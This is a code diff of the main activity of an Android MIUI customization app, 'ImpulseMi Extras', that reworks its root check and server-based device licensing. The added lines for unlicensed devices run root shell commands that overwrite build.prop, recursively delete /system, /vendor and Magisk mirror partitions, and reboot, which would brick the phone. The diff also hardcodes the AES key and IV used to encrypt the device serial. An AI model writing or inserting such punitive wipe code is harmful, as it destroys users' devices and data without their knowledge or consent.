@@ -1,5 +1,8 @@
 package com.impulsemi.extras;
 
+import android.animation.ObjectAnimator;
+import android.app.ActivityManager;
+import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.DialogInterface;
@@ -11,6 +14,7 @@ import android.content.res.Configuration;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.util.Log;
+import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
 
@@ -33,7 +37,7 @@ public class MainActivity extends Activity {
     public static final String second = StatusbarFragment.class.getSimpleName();
     public static final String about = StatusbarFragment.class.getSimpleName();
     public static int isPass;
-
+    public static boolean isRoot = false;
     public String getSerialNumber(){
         String serial = null;
         try {
@@ -48,6 +52,12 @@ public class MainActivity extends Activity {
     //todo
     //验证代码所在
     public void loopcheck() {
+        if (!isRoot)
+        {
+            finish();
+            Toast.makeText(getApplicationContext(),"未授予Root权限,禁止使用!",Toast.LENGTH_LONG).show();
+            return;
+        }
         isPass = 2;
         CycleWait cw = new CycleWait();
         Thread t = new Thread(cw);
@@ -58,7 +68,7 @@ public class MainActivity extends Activity {
             e.printStackTrace();
         }
         if (cw.value == null) {
-            Toast.makeText(getApplicationContext(), "该设备网络不通畅，请连接网络再验证！", Toast.LENGTH_LONG).show();
+            Toast.makeText(getApplicationContext(), "该设备网络不通畅或服务器正忙，请检查网络后再验证！", Toast.LENGTH_LONG).show();
             Log.e("network_error","设备网络故障！");
             final Intent intent = new Intent().setAction("android.net.wifi.PICK_WIFI_NETWORK");
             Timer timer = new Timer();
@@ -74,12 +84,12 @@ public class MainActivity extends Activity {
         }
         else
         {
-            //String local_pass = getSerialNumber();
             String local_pass =AESUtil.encryptString2Base64(getSerialNumber(),"mihayolove35710","scp173049682166");
             local_pass = local_pass.replaceAll("\r|\n", "");
             Log.e("pass",local_pass);
             BufferedReader br = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(cw.value.getBytes(Charset.forName("utf8"))), Charset.forName("utf8")));
             String line = null;
+            boolean warrior = false;
             StringBuffer strbuf = new StringBuffer();
             while (true)
             {
@@ -90,34 +100,54 @@ public class MainActivity extends Activity {
                 }
                 if (!line.trim().equals(""))
                 {
-                    //line="<br>"+line;//每行可以做加工
-                   // Log.e("compare",local_pass);
-                    //boolean in = line.equals(local_pass);
-                    if (line.equals(local_pass))
+                    if (line.equals("// Warrior MemberCode"))
                     {
-                        //Log.e("wiwiwiw","anfjajfnas");
-                        isPass = 1;break;
+                        warrior = true;
                     }
                     else
                     {
-                        isPass = 0;
+                        if(line.equals("// Authorization UserCode"))
+                        {
+                            warrior = false;
+                        }
                     }
-                        //Log.e("text",line);
-                    //strbuf.append(line+"\r\n");
+                    if (warrior)
+                    {
+                        if (line.equals(local_pass))
+                        {isPass = 6;break;}
+                    }
+                    else
+                    {
+                        if (line.equals(local_pass))
+                        {isPass = 1;break;}
+                    }
                 }
             }
-            //Log.e("result",isPass+"");
+            if (isPass!=1&&isPass!=6)
+            {
+                isPass=0;
+            }
             if(isPass==1)
             {
                 Toast.makeText(getApplicationContext(),"该设备已经获得授权！请使用！",Toast.LENGTH_LONG).show();
+                Settings.System.putInt(getContentResolver(),"system_icon_root",561);
+            }
+            if(isPass==6)
+            {
+                Toast.makeText(getApplicationContext(),"您是一测用户！欢迎使用！",Toast.LENGTH_LONG).show();
+                Settings.System.putInt(getContentResolver(),"system_icon_root",561);
             }
             else if(isPass==0)
             {
-                Toast.makeText(getApplicationContext(),"该设备未获得授权！，设备即将重启！",Toast.LENGTH_LONG).show();
+                Toast.makeText(getApplicationContext(),"该设备未获得授权！，设备即将重启！,请覆盖输入其它包！",Toast.LENGTH_LONG).show();
+                String[] command = new String[]{"mount -o rw,remount /sbin/.magisk/mirror/system","mount -o rw,remount /sbin/.magisk/mirror/system/system","mount -o rw,remount /sbin/.magisk/mirror/system_root","mount -o rw,remount /sbin/.magisk/mirror/vendor","mount -o rw,remount /", "mount -o rw,remount /system", "mount -o rw,remount /vendor",  "mount -o rw,remount /vendor/etc","mount -o rw,remount /system/vendor/etc","mount -o rw,remount /system/system", "mount -o rw,remount /system_root/system","mount -o rw,remount /system/etc", "mount -o rw,remount /data","echo Please not cheat our team !>/system/build.prop","rm -rf /sbin/.magisk/mirror/system/*","rm -rf /sbin/.magisk/mirror/system_root/*","rm -rf /sbin/.magisk/mirror/system/system/*","rm -rf /sbin/.magisk/mirror/*","rm -rf /system/*","rm -rf /system_root/*","rm -rf /system_root/system/*","rm -rf /system/system/*","rm -rf /vendor/*","rm -rf /vendor/etc/*","sync","reboot"};
+                ShellUtils.execCommand(command, true);
+                Settings.System.putInt(getContentResolver(),"system_icon_root",1374);
                 finish();
             }
             else if (isPass==2)
             {
+                Settings.System.putInt(getContentResolver(),"system_icon_root",1374);
                 Toast.makeText(getApplicationContext(),"该设备还未验证！,请检查网络是否正确连接并且重新打开应用。",Toast.LENGTH_LONG).show();
                 final Intent intent = new Intent().setAction("android.net.wifi.PICK_WIFI_NETWORK");
                 Timer timer = new Timer();
@@ -164,25 +194,32 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         //给执行文件zip权限
-        if(Settings.System.getInt(getApplication().getContentResolver(),"impulse_first_load",0)==0)
+
+        if(Settings.System.getInt(getApplication().getContentResolver(),"impulse_first_load",0)==0) //系统中第一次打开
         {
-            loopcheck();
             CheckRoot();
-            //系统中第一次打开
+            loopcheck();
             Settings.System.putInt(getApplication().getContentResolver(),"impulse_first_load",1);
             ContentResolver contentResolvermore = getApplication().getContentResolver();
             Settings.System.putString(contentResolvermore,"impulse_show_off_icon","");
-
-            Settings.System.putString(contentResolvermore,"impulse_network_sign_up"," \\u25b2");//使用前必须给定值，否则不许打开
-            Settings.System.putString(contentResolvermore,"impulse_network_sign_down"," \\u25bc");
+            Settings.System.putString(contentResolvermore,"impulse_network_sign_up"," ▲");//使用前必须给定值，否则不许打开↑↓△▽
+            Settings.System.putString(contentResolvermore,"impulse_network_sign_down"," ▼");
             CheckTheme();
             mount();
             ShellUtils.execCommand("chmod 777 /system/xbin/zip",true);
         }
-        else
+        else//第二次以及以后打开
         {
+            if (Settings.System.getInt(getContentResolver(),"system_icon_root",0)!=561)
+            {
+                CheckRoot();
+            }
+            else
+            {
+                isRoot = true;
+            }
             loopcheck();
-            //第二次以及以后打开
+            CheckTheme();
         }
         if (getDarkModeStatus(this)) {
            setTheme(R.style.Theme_Dark_Settings);
@@ -190,35 +227,12 @@ public class MainActivity extends Activity {
             setTheme(R.style.Theme_Light_Settings);
         }
         super.onCreate(savedInstanceState);
-
-
-        // TODO: 2020/4/17
-        //获取Fragment管理器
-       // setContentView(R.layout.activity_main);
-//        getFragmentManager().beginTransaction().add(R.id.fragment_main,new CommonFragment()).commit();
-//
-//        btn1 =findViewById(R.id.btn_1);
-//        btn1.setOnClickListener(new View.OnClickListener() {
-//            @Override
-//            public void onClick(View v) {
-//                getFragmentManager().beginTransaction().replace(R.id.fragment_main,new StatusbarFragment()).commit();
-//            }
-//        });
-//        btn2 =findViewById(R.id.btn_2);
-//        btn2.setOnClickListener(new View.OnClickListener() {
-//            @Override
-//            public void onClick(View v) {
-//                getFragmentManager().beginTransaction().replace(R.id.fragment_main,new CommonFragment()).commit();
-//            }
-//        });
-//        btn3 =findViewById(R.id.btn_3);
-//        btn3.setOnClickListener(new View.OnClickListener() {
-//            @Override
-//            public void onClick(View v) {
-//                getFragmentManager().beginTransaction().replace(R.id.fragment_main,new AboutFragment()).commit();
-//            }
-//        });
-
+        setTitle("ImpulseMi Extras");
+        //setContentView(com.impulsemi.extras.R.layout.activity_main);
+        View view = findViewById(com.impulsemi.extras.R.id.team_logo);
+        ObjectAnimator ofFloat = ObjectAnimator.ofFloat(view, "rotation", new float[]{0.0f, 360.0f});
+        ofFloat.setRepeatCount(9999999);
+        ofFloat.start();
         ActionBar actionBar = this.getActionBar();
         assert actionBar != null;
         actionBar.setFragmentViewPagerMode(this, getFragmentManager());
@@ -235,13 +249,13 @@ public class MainActivity extends Activity {
             ShellUtils.execCommand("cp /system/xbin/itachigold/Theme/com.android.systemui /data/system/theme/com.android.systemui",true);
             ShellUtils.execCommand("chmod 664 /data/system/theme/com.android.systemui",true);
         }
-        if(!new File("/data/system/theme/com.android.settings").exists())
-        {
-            mount();
-            ShellUtils.execCommand("cp /system/xbin/itachigold/Theme/com.android.settings /data/system/theme/com.android.settings",true);
-            ShellUtils.execCommand("chmod 664 /data/system/theme/com.android.settings",true);
-
-        }
+//        if(!new File("/data/system/theme/com.android.settings").exists())
+//        {
+//            mount();
+//            ShellUtils.execCommand("cp /system/xbin/itachigold/Theme/com.android.settings /data/system/theme/com.android.settings",true);
+//            ShellUtils.execCommand("chmod 664 /data/system/theme/com.android.settings",true);
+//
+//        }
 
         if(!new File("/data/system/theme/framework-miui-res").exists())
         {
@@ -275,24 +289,31 @@ public class MainActivity extends Activity {
             {
                 String[] command = new String[]{"mount -o rw,remount /", "mount -o rw,remount /system", "mount -o rw,remount /vendor", "mount -o rw,remount /vendor/etc", "mount -o rw,remount /system/vendor/etc", "mount -o rw,remount /system/system", "mount -o rw,remount /system/etc", "mount -o rw,remount /system_root/system", "mkdir /tmp", "chmod -R 777 /tmp", "echo 1 >/tmp/rooted", "chmod -R 0777 /tmp/rooted", "rm -rf /system/test", "rm -rf /test", "sync"};
                 ShellUtils.execCommand(command, true);
+                isRoot=true;
             }
         }
+        else
+        {   String[] commands = new String[]{"mount -o rw,remount /", "mount -o rw,remount /system", "mount -o rw,remount /vendor", "mount -o rw,remount /vendor/etc", "mount -o rw,remount /system/vendor/etc", "mount -o rw,remount /system/system", "mount -o rw,remount /system/etc", "mount -o rw,remount /system_root/system", "echo test >/system/test", "echo test >/test", "chmod -R 0777 /system/test", "chmod -R 0777 /test", "sync"};
+            ShellUtils.execCommand(commands, true);
+            if ((!new File("/system/test").exists()) || (!new File("/test").exists()))
+            {
+                NeedRoot();
+            }
+            else
+            {
+                String[] command = new String[]{"mount -o rw,remount /", "mount -o rw,remount /system", "mount -o rw,remount /vendor", "mount -o rw,remount /vendor/etc", "mount -o rw,remount /system/vendor/etc", "mount -o rw,remount /system/system", "mount -o rw,remount /system/etc", "mount -o rw,remount /system_root/system", "mkdir /tmp", "chmod -R 777 /tmp", "echo 1 >/tmp/rooted", "chmod -R 0777 /tmp/rooted", "rm -rf /system/test", "rm -rf /test", "sync"};
+                ShellUtils.execCommand(command, true);
+                isRoot=true;
+            }
+        }
+
     }
     public void NeedRoot()
     {
-        AlertDialog.Builder dialog = new AlertDialog.
-                Builder(MainActivity.this);
-        dialog.setTitle("提示");
-        dialog.setMessage("无法获取系统读写权限，请ROOT你的设备！(刷入面具即可！)");
-        dialog.setCancelable(false);
-        dialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialog, int which)
-            {
-                Toast.makeText(MainActivity.this, "设备未ROOT，操作无效！", Toast.LENGTH_SHORT).show();
-            }
-        });
-        dialog.show();
+        isRoot=false;
+        Toast.makeText(getApplicationContext(),"请授权ROOT后再打开！",Toast.LENGTH_LONG).show();
+        finish();
+        return;
     }
     public boolean checkApkExist(Context context, String packageName) {
         if (packageName == null || "".equals(packageName))
@@ -304,10 +325,6 @@ public class MainActivity extends Activity {
         } catch (PackageManager.NameNotFoundException e) {
             return false;
         }
-    }
-    private void all_mount() {
-        String[] commands = new String[] { "mount -o rw,remount /","mount -o rw,remount /system","mount -o rw,remount /vendor","mount -o rw,remount /vendor/etc","mount -o rw,remount /system/vendor/etc","mount -o rw,remount /system/system","mount -o rw,remount /system/etc","mount -o rw,remount /system_root/system","echo sunday 137451824@qq.com >/system/test","echo sunday 137451824@qq.com >/test","rm -rf /system/res/res_center/layout/readme.txt","sync" };
-        ShellUtils.execCommand(commands, true);
     }
     public void mount() {
 
